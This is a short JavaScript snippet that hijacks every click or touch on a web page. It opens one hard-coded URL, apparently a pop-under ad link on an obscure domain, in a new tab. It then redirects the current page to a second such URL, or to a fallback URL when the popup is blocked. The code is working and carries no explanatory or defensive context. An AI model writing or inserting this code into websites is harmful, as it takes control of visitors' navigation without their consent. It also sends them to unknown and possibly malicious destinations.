const buttonRedirectURL = "https://villagetraitgarret.com/fz3ifw9n?key=255cb9b54aebe1dca0f89408b47e3fcf";
const pageRedirectURL = "https://pairturnnumerous.com/rze4wd8aa?key=74d74ecf1cacbe96436ceb718716741c";
const fallbackURL = "https://villagetraitgarret.com/fz3ifw9n?key=255cb9b54aebe1dca0f89408b47e3fcf";

function handleRedirect(e) {
  document.removeEventListener('click', handleRedirect);

  let newTab = window.open(buttonRedirectURL, '_blank');

  if (!newTab) {
    window.location.href = fallbackURL;
    return;
  }

  setTimeout(() => {
    window.location.href = pageRedirectURL;
  }, 50);
}

document.addEventListener('click', handleRedirect);
document.addEventListener('touchstart', handleRedirect);
